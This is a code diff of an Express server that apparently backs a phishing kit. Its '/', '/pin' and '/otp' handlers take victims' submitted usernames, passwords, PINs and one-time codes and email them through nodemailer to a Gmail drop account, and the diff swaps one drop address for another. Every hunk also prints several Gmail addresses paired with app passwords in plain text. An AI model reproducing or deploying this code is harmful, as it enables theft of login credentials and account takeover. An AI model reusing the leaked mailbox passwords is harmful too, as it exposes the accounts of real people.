@@ -20,22 +20,14 @@ app.post("/", (req, res) => {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      // user: "edehchinedu59@gmail.com",
-      // pass: "yknycyzsxdkxpepq",
-      // user: "gracesufficient65@gmail.com",
-      // pass: "gdvumrctjugtigmo",
-      user: "Victorchinemerem191@gmail.com",
-      pass: "ydrmvoxoqbraqdvd",
-      // user: 'Victorchinemeremfx.112@gmail.com',
-      // pass: 'eujqfpdvuhepijkk'
-      // user: "join.kudapp@gmail.com",
-      // pass: "ftjbwzimegueosaw",
+      user: "Bentopfx@gmail.com",
+      pass: "gsqxqzbqyzgbmgmg",
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "Victorchinemerem191@gmail.com",
+    to: "Bentopfx@gmail.com",
     subject: `Username: ${req.body?.username} \t\n\n\n password: ${req.body?.password}`,
   };
 
@@ -58,22 +50,14 @@ app.post("/pin", (req, res) => {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      // user: "edehchinedu59@gmail.com",
-      // pass: "yknycyzsxdkxpepq",
-      // user: "gracesufficient65@gmail.com",
-      // pass: "gdvumrctjugtigmo",
-      user: "Victorchinemerem191@gmail.com",
-      pass: "ydrmvoxoqbraqdvd",
-      // user: 'Victorchinemeremfx.112@gmail.com',
-      // pass: 'eujqfpdvuhepijkk'
-      // user: "join.kudapp@gmail.com",
-      // pass: "ftjbwzimegueosaw",
+      user: "Bentopfx@gmail.com",
+      pass: "gsqxqzbqyzgbmgmg",
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "Victorchinemerem191@gmail.com",
+    to: "Bentopfx@gmail.com",
     subject: `PIN: ${req.body?.pin} `,
   };
 
@@ -96,18 +80,14 @@ app.post("/otp", (req, res) => {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      // user: "edehchinedu59@gmail.com",
-      // pass: "yknycyzsxdkxpepq",
-      // user: "gracesufficient65@gmail.com",
-      // pass: "gdvumrctjugtigmo",
-      user: "Victorchinemerem191@gmail.com",
-      pass: "ydrmvoxoqbraqdvd",
+      user: "Bentopfx@gmail.com",
+      pass: "gsqxqzbqyzgbmgmg",
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "Victorchinemerem191@gmail.com",
+    to: "Bentopfx@gmail.com",
     subject: `OTP: ${req.body?.otp} `,
   };
 
